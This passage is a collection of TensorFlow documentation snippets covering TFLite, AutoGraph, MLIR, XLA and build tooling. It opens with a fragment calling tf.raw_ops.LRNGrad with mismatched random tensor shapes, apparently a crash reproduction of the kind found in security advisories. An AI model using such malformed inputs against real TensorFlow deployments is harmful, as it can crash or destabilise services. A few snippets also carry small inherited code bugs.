input_image = tf.random.uniform(shape=[4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)
output_image = tf.random.uniform(shape=[4, 4, 4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)
tf.raw_ops.LRNGrad(input_grads=input_grads, input_image=input_image, output_image=output_image, depth_radius=depth_radius, bias=bias, alpha=alpha, beta=beta)
```

----------------------------------------

TITLE: Defining Default TFLite GPU Delegate Options (V2 C++)
DESCRIPTION: This C++ snippet illustrates how the default options for the V2 TFLite GPU delegate are represented programmatically. It shows that the default settings are retrieved via a function call, indicating how to explicitly define options if needed instead of using `nullptr`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/gpu/README.md#_snippet_3

LANGUAGE: c++
CODE:
```
const TfLiteGpuDelegateOptionsV2 kDefaultOptions =
    TfLiteGpuDelegateOptionsV2Default();
```

----------------------------------------

TITLE: Dump HLO using XLA_FLAGS
DESCRIPTION: This command demonstrates how to use the `XLA_FLAGS` environment variable to automatically dump all HLO files and other artifacts generated during the compilation and execution of an XLA program. The `--xla_dump_to` flag specifies the directory where the outputs will be saved.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_0

LANGUAGE: Bash
CODE:
```
XLA_FLAGS=--xla_dump_to=/tmp/myfolder ./myprogram-entry-point
```

----------------------------------------

TITLE: Get Mean Value by Index Python
DESCRIPTION: This method retrieves a single floating-point mean value from the normalization options at the specified index `j`. It allows accessing elements of the mean array one by one.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptions.md#_snippet_3

LANGUAGE: Python
CODE:
```
Mean(
    j
)
```

----------------------------------------

TITLE: Configuring TFLite Converter for 16x8 Quantization Python
DESCRIPTION: Configures the TensorFlow Lite Converter to apply post-training quantization. It sets the optimization flag to use default optimizations and explicitly specifies the target operations set as the experimental 16x8 integer quantization mode.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant_16x8.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
converter.optimizations = [tf.lite.Optimize.DEFAULT]
converter.target_spec.supported_ops = [tf.lite.OpsSet.EXPERIMENTAL_TFLITE_BUILTINS_ACTIVATIONS_INT16_WEIGHTS_INT8]
```

----------------------------------------

TITLE: Modifying Python Object in Method - Indirect Side Effect Problem
DESCRIPTION: Similar to function calls, modifications to Python object properties (not `tf.Variable`) that occur indirectly via method calls are not visible to AutoGraph's static analysis, leading to incorrect tracking within transformed control flow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_15

LANGUAGE: python
CODE:
```
class MyClass(object):
  def change(self):
    self.y += 1

c = MyClass()
while x > 0:
  c.change()  # Problem -- modification to c.y is not visible here!
```

----------------------------------------

TITLE: Example Build TFLite Python (aarch64, Py3.8) - Shell
DESCRIPTION: Example command demonstrating how to use the Makefile helper to build the TensorFlow Lite Python package within a Docker container, specifically targeting the `aarch64` (ARM 64-bit) architecture and Python 3.8. This requires Docker and the TensorFlow source code. It's suitable for devices like Coral Mendel or Raspberry Pi with 64-bit Ubuntu.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake_pip.md#_snippet_3

LANGUAGE: sh
CODE:
```
make -C tensorflow/lite/tools/pip_package docker-build \
  TENSORFLOW_TARGET=aarch64 PYTHON_VERSION=3.8
```

----------------------------------------

TITLE: Initializing BertQuestionAnswererOptions Python
DESCRIPTION: This is the constructor signature for the `tflite_support.task.text.BertQuestionAnswererOptions` class. It requires a `base_options` parameter, typed as `tflite_support.task.core.BaseOptions`, which is used for basic model configuration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/BertQuestionAnswererOptions.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.text.BertQuestionAnswererOptions(
    base_options: tflite_support.task.core.BaseOptions
)
```

----------------------------------------

TITLE: Initializing MobileNetV2 Spec in TFLite Model Maker (Python)
DESCRIPTION: This snippet shows the constructor signature for `MobileNetV2Spec`. It allows customization of the MobileNet V2 model by specifying the pretrained model URI, compatible TensorFlow versions, input image dimensions, and a descriptive name for use within the TFLite Model Maker library for image classification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/MobileNetV2Spec.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_model_maker.image_classifier.MobileNetV2Spec(
    *,
    uri='https://tfhub.dev/google/tf2-preview/mobilenet_v2/feature_vector/4',
    compat_tf_versions=2,
    input_image_shape=None,
    name='mobilenet_v2'
)
```

----------------------------------------

TITLE: Modifying Global Python Variable in Function - Indirect Side Effect Problem
DESCRIPTION: AutoGraph's static analysis is typically limited to the current function. Modifications to Python objects (not `tf.Variable`) that occur indirectly via calls to other functions are not detected, leading to incorrect variable tracking within transformed control flow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_10

LANGUAGE: python
CODE:
```
def change_y():
  global y
  y = y + 1

while x > 0:
  change_y()  # Problem -- change made to y is not visible here!
```

----------------------------------------

TITLE: Transforming Python While Loop with AutoGraph
DESCRIPTION: Shows how a Python while loop (`while cond: body`) is transformed into a call to the `ag__.while_stmt` operator. The loop condition and body are represented by thunks (functions), and loop variables are managed explicitly via `get_state` and `set_state` functions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/operators.md#_snippet_5

LANGUAGE: Python
CODE:
```
while j > 10:
  j = j + i
```

LANGUAGE: Python
CODE:
```
def get_state():
    return (j,)

def set_state(vars_):
    nonlocal j
    (j,) = vars_

def loop_test():
    nonlocal j
    return j > 10

def loop_body():
    nonlocal j
    j = j + i

ag__.while_stmt(loop_test, loop_body, get_state, set_state, ('j',), {})
```

----------------------------------------

TITLE: Creating a Python-to-Python Transpiler Adding Extra Locals and Modifying AST
DESCRIPTION: Defines `HelloTranspiler`, a `PyToPy` transpiler that adds an extra local variable 'name' via `get_extra_locals`. Its `transform_ast` method parses a print statement AST and prepends it to the input function's body. This demonstrates injecting code and dependencies (locals) into the transformed function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/pyct_tutorial.ipynb#_snippet_10

LANGUAGE: python
CODE:
```
from tensorflow.python.autograph.pyct import parser


class HelloTranspiler(transpiler.PyToPy):

  def get_caching_key(self, ctx):
    return 0

  def get_extra_locals(self):
    return {'name': 'you'}

  def transform_ast(self, ast, transformer_context):
    print_code = parser.parse('print("Hello", name)')
    ast.body = [print_code] + ast.body
    return ast


def f(x, y):
  pass

new_f, _, _ = HelloTranspiler().transform(f, None)

_ = new_f(1, 1)
```

----------------------------------------

TITLE: Building TensorFlow Lite Minimal Example
DESCRIPTION: Executes the build process using CMake in the build directory. The `-j` flag attempts to parallelize the build. This compiles the minimal TensorFlow Lite application.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/minimal/README.md#_snippet_4

LANGUAGE: sh
CODE:
```
cmake --build . -j
```

----------------------------------------

TITLE: Iterating tf.range with AutoGraph for loop Python
DESCRIPTION: Shows how AutoGraph transforms a Python `for` loop using `tf.range` into a TensorFlow `tf.while_loop`. The loop iterates using arguments provided to `tf.range`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_21

LANGUAGE: Python
CODE:
```
for i in tf.range(3):
  tf.print('iteration:', i)
```

----------------------------------------

TITLE: Initializing BoundingBoxPropertiesT from Buffer - Python
DESCRIPTION: Documents the class method `InitFromBuf` which initializes a `BoundingBoxPropertiesT` object from a flatbuffer buffer. It takes the buffer (`buf`) and a starting position (`pos`) within the buffer as parameters, facilitating deserialization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxPropertiesT.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)
```

----------------------------------------

TITLE: Defining Input-Target Splitting Function - Python
DESCRIPTION: This Python function takes a sequence chunk and splits it into two parts: the input sequence (all characters except the last) and the target sequence (all characters except the first). This creates the pairs needed for training the model to predict the next character.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_9

LANGUAGE: python
CODE:
```
def split_input_target(chunk):
    input_text = chunk[:-1]
    target_text = chunk[1:]
    return input_text, target_text
```

----------------------------------------

TITLE: Defining Bazel Objective-C Library Dependency Python
DESCRIPTION: Specifies a dependency on the TensorFlow Lite Objective-C library target within a Bazel BUILD file's `objc_library` rule. This includes the library when building the dependent target.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/objc/README.md#_snippet_5

LANGUAGE: python
CODE:
```
objc_library(\n    deps=[\n        "//tensorflow/lite/objc:TensorFlowLite",\n    ],)
```

----------------------------------------

TITLE: Initializing ImagePropertiesT from Packed Buffer in Python
DESCRIPTION: This class method deserializes an `ImagePropertiesT` object from a potentially packed byte buffer (`buf`), optionally starting from a given position (`pos=0`). It likely handles a specific packing format or version of the FlatBuffers schema. This method provides an alternative way to load the object from binary data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImagePropertiesT.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)
```

----------------------------------------

TITLE: Getting Default Quantization Config in AverageWordVecSpec
DESCRIPTION: Provides the default configuration settings for model quantization. This config can be used to optimize the model size and performance for deployment.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/AverageWordVecSpec.md#_snippet_5

LANGUAGE: python
CODE:
```
get_default_quantization_config()
```

----------------------------------------

TITLE: Optimizing TFLite Model (Post-Training Quantization)
DESCRIPTION: Defines a `representative_dataset` generator for post-training quantization calibration. It uses the experimental `tf.lite.TFLiteConverter.experimental_from_jax` to convert the JAX function directly, enables default optimizations (including quantization), specifies `TFLITE_BUILTINS_INT8` as the target operation set, and converts the model to a quantized TFLite format, saving it as 'jax_mnist_quant.tflite'.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite.ipynb#_snippet_11

LANGUAGE: Python
CODE:
```
def representative_dataset():
  for i in range(1000):
    x = train_images[i:i+1]
    yield [x]
x_input = jnp.zeros((1, 28, 28))
converter = tf.lite.TFLiteConverter.experimental_from_jax(
    [serving_func], [[('x', x_input)]])
tflite_model = converter.convert()
converter.optimizations = [tf.lite.Optimize.DEFAULT]
converter.representative_dataset = representative_dataset
converter.target_spec.supported_ops = [tf.lite.OpsSet.TFLITE_BUILTINS_INT8]
tflite_quant_model = converter.convert()
with open('jax_mnist_quant.tflite', 'wb') as f:
  f.write(tflite_quant_model)
```

----------------------------------------

TITLE: Apply quantize_weights Transform (Bash)
DESCRIPTION: This snippet shows how to build and run the `transform_graph` tool using Bazel to apply the `quantize_weights` transform. This transform converts floating-point weights directly into eight-bit values, significantly reducing the output graph file size compared to the original. Although it introduces runtime decompression ops, these are typically optimized and don't noticeably slow down graph execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/graph_transforms/README.md#_snippet_5

LANGUAGE: bash
CODE:
```
bazel build tensorflow/tools/graph_transforms:transform_graph
bazel-bin/tensorflow/tools/graph_transforms/transform_graph \
--in_graph=tensorflow_inception_graph.pb \
--out_graph=optimized_inception_graph.pb \
--inputs='Mul' \
--outputs='softmax' \
--transforms='
  strip_unused_nodes(type=float, shape="1,299,299,3")
  fold_constants(ignore_errors=true)
  fold_batch_norms
  fold_old_batch_norms
  quantize_weights'
```

----------------------------------------

TITLE: Wrapping Operations with tf_executor.island MLIR
DESCRIPTION: This MLIR snippet illustrates how to use `tf_executor.island` to group `tf` dialect operations (`tf.Add`, `tf.Mul`). It shows implicit value capture (`%0`, `%1`), explicit control input (`%ctl0`), and results (`%2`, `%ctl2`) including a control token. The `tf_executor.yield` operation defines the island's data output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tensorflow/g3doc/tf_dialects.md#_snippet_2

LANGUAGE: MLIR
CODE:
```
// The island is capturing implicitly %0 and %1. It is also taking a control
// dependency %ctl0 as input. It produces a tensor<*xf32> value matching the
// argument of the yield terminator, as well as an extra control token.
%2, %ctl2 = tf_executor.island (%ctl0)
                  : (tensor<*xf32>, !tf_executor<"control">) -> tensor<*xf32> {
  %added = tf.Add %1, %0 : tensor<*xf32>
  %mul = tf.Mul %added, %1 :tensor<*xf32>

  // The yield terminator operands are the result values of the island.
  tf_executor.yield %mul : tensor<*xf32>
}
```

----------------------------------------

TITLE: Accessing Max Values as NumPy Array in Python
DESCRIPTION: This instance method retrieves the list of maximum values from the statistical data and returns it as a NumPy array. This is useful for numerical processing and analysis.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Stats.md#_snippet_4

LANGUAGE: Python
CODE:
```
MaxAsNumpy()
```

----------------------------------------

TITLE: MLIR Graph Before Space-to-Depth RewritePass MLIR
DESCRIPTION: This MLIR snippet shows a simplified representation of a graph structure before the automatic space-to-depth rewrite pass is applied. It depicts an input being retrieved via `tf.IteratorGetNext` and then directly passed to a `tf.Conv2D` operation within a `tf_device.launch_func`, illustrating the original, non-optimized flow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tensorflow/g3doc/space_to_depth.md#_snippet_2

LANGUAGE: MLIR
CODE:
```
// Example: original program:
//
module {
   func @while_body {
     %input = "tf.IteratorGetNext"(...) {device = "/CPU:0"}:
              -> tensor<2x224x224x3xf32>
     %device_launch = "tf_device.launch_func"(%input,...) {func = @_func,...)
     return ...
   }
   func @_func(%input: tensor<2x224x224x3xf32>,
               %filter: tensor<7x7x3x64xf32>) {
     %6 = "tf.Conv2D"(%input, %filter)  {strides = [1, 2, 2, 1]}:
                 (tensor<2x230x230x3xf32>, tensor<7x7x3x64xf32>) ->
      tensor<2x112x112x64xf32>
   }
}
```

----------------------------------------

TITLE: Implementing Custom Training Loop with TPUStrategy - Python
DESCRIPTION: This example shows how to use tf.distribute.TPUStrategy with a custom training loop on a TPU. It involves creating the strategy, defining the model within the strategy's scope, wrapping the training step logic in a tf.function, distributing the dataset, and running the step using strategy.run.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/distribute/README.md#_snippet_1

LANGUAGE: python
CODE:
```
# Create the strategy instance.
tpu_strategy = tf.distribute.TPUStrategy(resolver)


# Create the keras model under strategy.scope()
with tpu_strategy.scope():
  model = keras.layers.Dense(1, name="dense")

# Create custom training loop body as tf.function.
@tf.function
def train_step(iterator):
  def step_fn(inputs):
    images, targets = inputs
    with tf.GradientTape() as tape:
      outputs = model(images)
      loss = tf.reduce_sum(outputs - targets)
    grads = tape.gradient(loss, model.variables)
    return grads

  return tpu_strategy.run(
      step_fn, args=(next(iterator),))

# Run the loop body once on at dataset.
dataset = tf.data.Dataset.from_tensors(([1.], [1.])).repeat(100).batch(10
input_iterator = iter(tpu_strategy.experimental_distribute_dataset(dataset))
train_step(input_iterator)
```

----------------------------------------

TITLE: Get Embedding Dimension by Index TensorFlow Lite Python
DESCRIPTION: Returns the dimensionality of the embedding produced by a specific output layer of the model. Takes the integer `output_index` of the desired output layer. Returns the dimension as an integer or -1 if the index is invalid.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageEmbedder.md#_snippet_5

LANGUAGE: python
CODE:
```
get_embedding_dimension(
    output_index: int
) -> int
```

----------------------------------------

TITLE: Defining JAX Model Architecture and Metrics
DESCRIPTION: Defines the loss (negative log-likelihood) and accuracy functions used for training and evaluating the model. It then defines the neural network architecture (a simple MLP with two hidden layers) using JAX's stax library and initializes a pseudo-random number generator key for parameter initialization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite.ipynb#_snippet_7

LANGUAGE: Python
CODE:
```
def loss(params, batch):
  inputs, targets = batch
  preds = predict(params, inputs)
  return -jnp.mean(jnp.sum(preds * targets, axis=1))

def accuracy(params, batch):
  inputs, targets = batch
  target_class = jnp.argmax(targets, axis=1)
  predicted_class = jnp.argmax(predict(params, inputs), axis=1)
  return jnp.mean(predicted_class == target_class)

init_random_params, predict = stax.serial(
    stax.Flatten,
    stax.Dense(1024), stax.Relu,
    stax.Dense(1024), stax.Relu,
    stax.Dense(10), stax.LogSoftmax)

rng = random.PRNGKey(0)
```

----------------------------------------

TITLE: Run TFLite Model (without Pre/Post) Python
DESCRIPTION: This snippet runs the TFLite model converted from the SavedModel without integrated pre/post-processing. It uses the `run_tflite_model` function but passes the `input_tensor` which has already been pre-processed by the TensorFlow `resnet_image_processor`. The output is the model's logits, which are then processed using `tf.argmax` to get the predicted class index and printed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite_resnet50.ipynb#_snippet_14

LANGUAGE: python
CODE:
```
output_data_1 = run_tflite_model(tflite_model_1, input_tensor)
tfl_predicted_class_idx_1 = tf.argmax(output_data_1, axis=-1).numpy()
print("Predicted class:", model.config.id2label[tfl_predicted_class_idx_1[0]])
```

----------------------------------------

TITLE: Initializing TFLite Interpreter with Core ML Delegate (Swift)
DESCRIPTION: Demonstrates how to create a CoreMLDelegate instance and pass it to the Interpreter constructor to enable Core ML acceleration for the model. This requires the TensorFlow Lite Swift library to be included in your project.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/coreml/README.md#_snippet_0

LANGUAGE: Swift
CODE:
```
let coreMlDelegate = CoreMLDelegate()
let interpreter = try Interpreter(modelPath: modelPath,
                                  delegates: [coreMLDelegate])
```

----------------------------------------

TITLE: Initializing ScoreCalibrationMd Class Python
DESCRIPTION: This snippet shows the constructor signature for the `ScoreCalibrationMd` class. It is used to create an instance of the class, providing necessary parameters for defining score calibration metadata. Required parameters include the type of score transformation, a default score value, and the path to the score calibration file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/ScoreCalibrationMd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.metadata_info.ScoreCalibrationMd(
    score_transformation_type: tflite_support.metadata_schema_py_generated.ScoreTransformationType,
    default_score: float,
    file_path: str
)
```

----------------------------------------

TITLE: Initializing ImageSearcherOptions in Python
DESCRIPTION: Defines the constructor for the `ImageSearcherOptions` class. It takes base options, optional embedding options, and optional search options to configure the image searcher task. The `embedding_options` and `search_options` have default factory values.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageSearcherOptions.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.vision.ImageSearcherOptions(
    base_options: <a href="../../../tflite_support/task/core/BaseOptions"><code>tflite_support.task.core.BaseOptions</code></a>,
    embedding_options: <a href="../../../tflite_support/task/processor/EmbeddingOptions"><code>tflite_support.task.processor.EmbeddingOptions</code></a> = dataclasses.field(default_factory=_EmbeddingOptions),
    search_options: <a href="../../../tflite_support/task/processor/SearchOptions"><code>tflite_support.task.processor.SearchOptions</code></a> = dataclasses.field(default_factory=_SearchOptions)
)
```

----------------------------------------

TITLE: Specifying TFLite Target Spec for Compatibility Check Python
DESCRIPTION: Illustrates how to configure the compatibility check to use a specific `tf.lite.TargetSpec`, mirroring the options available in `TFLiteConverter`. By passing a `target_spec` (here including `SELECT_TF_OPS`), the check validates against the specified set of supported operations, allowing for more targeted compatibility analysis that aligns with the intended deployment environment.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/authoring.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
target_spec = tf.lite.TargetSpec()
target_spec.supported_ops = [
 tf.lite.OpsSet.TFLITE_BUILTINS,
 tf.lite.OpsSet.SELECT_TF_OPS,
]
@tf.lite.experimental.authoring.compatible(converter_target_spec=target_spec, raise_exception=True)
@tf.function(input_signature=[
 tf.TensorSpec(shape=[None], dtype=tf.float32)
])
def f(x):
 return tf.cosh(x)

# Evaluate the tf.function
result = f(tf.constant([0.0]))
print (f"result = {result}")
```

----------------------------------------

TITLE: Initializing NLClassifier in Python
DESCRIPTION: Documents the constructor signature for the `NLClassifier` class in TensorFlow Lite Support. It shows that the constructor requires an `NLClassifierOptions` object specifying configuration and an internal `_CppNLClassifier` instance. This constructor is typically used internally rather than by end-users. It returns `None`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/NLClassifier.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.text.NLClassifier(
    options: tflite_support.task.text.NLClassifierOptions,
    cpp_classifier: _CppNLClassifier
) -> None
```

----------------------------------------

TITLE: Viewing TFLite Benchmark Results on Android Logcat - Shell
DESCRIPTION: Filters the logcat output from the connected Android device using `adb logcat` and the `grep` command to display lines containing "Inference timings". The benchmark app logs its performance results, including initialization, warmup, and average inference times, using this tag.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/measurement.md#_snippet_2

LANGUAGE: Shell
CODE:
```
adb logcat | grep "Inference timings"
```

----------------------------------------

TITLE: Illustrative Asynchronous Execution Python Example
DESCRIPTION: This Python code snippet, using the JAX framework, demonstrates a common pattern that highlights the need for asynchronous execution and futures in PJRT. The `jax.jit` function enqueues a computation (`x + 1`), and the result (`x`) is needed later (`print(x + 1)`). An asynchronous PJRT plugin would return a future for `x`, allowing other operations to potentially proceed before blocking when `x` is actually used, illustrating the concept of waiting for a `PjRtFuture`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/pjrt/cpp_api_overview.md#_snippet_2

LANGUAGE: Python
CODE:
```
@jax.jit
def foo(x): return x + 1

x = foo(1)
# [...] other logic not using `x`
print(x + 1)
```

----------------------------------------

TITLE: Install Deps & Build TFLite Pip with CMake (Shell)
DESCRIPTION: Installs necessary system packages (swig, libjpeg-dev, zlib1g-dev, python3-dev, python3-numpy) using apt and Python packages (numpy, pybind11) using pip. It then executes the build script `build_pip_package_with_cmake.sh` to compile and package the TensorFlow Lite standalone Python wheel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/pip_package/README.md#_snippet_0

LANGUAGE: sh
CODE:
```
sudo apt install swig libjpeg-dev zlib1g-dev python3-dev python3-numpy
pip install numpy pybind11
sh tensorflow/lite/tools/pip_package/build_pip_package_with_cmake.sh
```

----------------------------------------

TITLE: Getting MobileBERT Classifier Model Spec in Python
DESCRIPTION: Retrieves the model specification for the 'mobilebert_classifier' architecture using TensorFlow Lite Model Maker. This spec is for a more complex model compared to 'average_word_vec' and requires different preprocessing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_14

LANGUAGE: python
CODE:
```
mb_spec = model_spec.get('mobilebert_classifier')
```

----------------------------------------

TITLE: Initializing QuestionAnswer Class (Python)
DESCRIPTION: Documents the constructor (`__init__`) for the `QuestionAnswer` class. This method is used to create an instance of the class, which serves as the entry point for question answering model tasks, including inference and exporting to TFLite. It requires a model specification and a boolean flag to determine if training data should be shuffled.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/QuestionAnswer.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.question_answer.QuestionAnswer(
    model_spec, shuffle
)
```

----------------------------------------

TITLE: Executing Java Program with TensorFlow JAR and JNI (Shell)
DESCRIPTION: Runs a compiled Java program that utilizes the TensorFlow Java API. It includes the `libtensorflow.jar` in the classpath and specifies the directory containing the native JNI library using the `java.library.path` system property.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/java/LEGACY.md#_snippet_3

LANGUAGE: Shell
CODE:
```
java -cp bazel-bin/tensorflow/java/libtensorflow.jar \
  -Djava.library.path=bazel-bin/tensorflow/java \
  ...
```

----------------------------------------

TITLE: Illustrating Non-Compilable TensorFlow Function for XLA Python
DESCRIPTION: Provides an example of a TensorFlow function that cannot be compiled by XLA using `jit_compile=True` because its tensor dimensions are not statically inferrable (`tf.unique` is used as an example).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/index.md#_snippet_2

LANGUAGE: Python
CODE:
```
@tf.function
def not_compilable(x):
  return tf.unique(x)
```

----------------------------------------

TITLE: Configure TFLite Release Build with CMake
DESCRIPTION: Runs the CMake configuration command from inside the build directory, pointing it to the TensorFlow Lite source directory within the cloned repository. By default, this command sets up the build environment for an optimized release binary.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_3

LANGUAGE: sh
CODE:
```
cmake ../tensorflow_src/tensorflow/lite
```

----------------------------------------

TITLE: Executing Function with Python List Modification in Eager Mode Python
DESCRIPTION: Executes the `fn()` function defined previously in TensorFlow eager mode. This works because eager execution uses Python's native control flow, which supports modifying Python lists.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_24

LANGUAGE: Python
CODE:
```
fn()
```

----------------------------------------

TITLE: Pushing Inference Diff Binary Android ADB
DESCRIPTION: This `adb push` command transfers the compiled Inference Diff tool binary from your local machine (where Bazel built it) to a temporary directory (`/data/local/tmp`) on the connected Android device. This makes the executable available on the device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/inference_diff/README.md#_snippet_1

LANGUAGE: bash
CODE:
```
adb push bazel-bin/third_party/tensorflow/lite/tools/evaluation/tasks/inference_diff/run_eval /data/local/tmp
```

----------------------------------------

TITLE: Demonstrating Unordered Execution in TensorFlow Function (Python)
DESCRIPTION: This Python snippet illustrates a common issue in `tf.function` tracing where side-effecting operations (like variable assignment) are not guaranteed to execute *after* non-side-effecting operations (like matrix multiplication) if there's no explicit control dependency. This means the variable assignment might occur even if the preceding operation encounters an error, deviating from sequential eager execution semantics.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/README.md#_snippet_1

LANGUAGE: Python
CODE:
```
@tf.function
def foo(x, y, variable):
   b = tf.matmul(x, y)
   variable.assign(1.0)
   return b
```

----------------------------------------

TITLE: Adding TensorFlow Lite Task Vision Dependency CocoaPods
DESCRIPTION: Add the `TensorFlowLiteTaskVision` pod to your iOS project's Podfile using CocoaPods. This integrates the TensorFlow Lite Task Library for vision tasks into your Xcode project.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/object_detector.md#_snippet_2

LANGUAGE: ruby
CODE:
```
target 'MyAppWithTaskAPI' do
  use_frameworks!
  pod 'TensorFlowLiteTaskVision'
end
```

----------------------------------------

TITLE: Creating EfficientDet-Lite1 Model Spec (Python)
DESCRIPTION: This code snippet shows the function signature and default values for creating an EfficientDet-Lite1 model specification. This spec object is used to configure various aspects of the model training process, including the base model URI, training epochs, batch size, and hardware strategy (CPU, GPU, TPU).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/EfficientDetLite1Spec.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.object_detector.EfficientDetLite1Spec(
    *,
    model_name='efficientdet-lite1',
    uri='https://tfhub.dev/tensorflow/efficientdet/lite1/feature-vector/1',
    hparams='',
    model_dir=None,
    epochs=50,
    batch_size=64,
    steps_per_execution=1,
    moving_average_decay=0,
    var_freeze_expr='(efficientnet|fpn_cells|resample_p6)',
    tflite_max_detections=25,
    strategy=None,
    tpu=None,
    gcp_project=None,
    tpu_zone=None,
    use_xla=False,
    profile=False,
    debug=False,
    tf_random_seed=111111,
    verbose=0
)
```

----------------------------------------

TITLE: Initializing TfLite with GPU Support (Java)
DESCRIPTION: Initialize the TFLite library through Play services, ensuring that the GPU delegate functionality is enabled by setting the corresponding option in the builder.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_26

LANGUAGE: Java
CODE:
```
TfLite.initialize(context,
          TfLiteInitializationOptions.builder()
           .setEnableGpuDelegateSupport(true)
           .build());
```

----------------------------------------

TITLE: Get Root As BoundingBoxProperties from Buffer Python
DESCRIPTION: Gets the root object of a FlatBuffer as a generic type. This method is used to initialize the FlatBuffer object from a buffer and offset, allowing access to its data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxProperties.md#_snippet_2

LANGUAGE: Python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)
```

----------------------------------------

TITLE: Accessing First Example Predictions Python
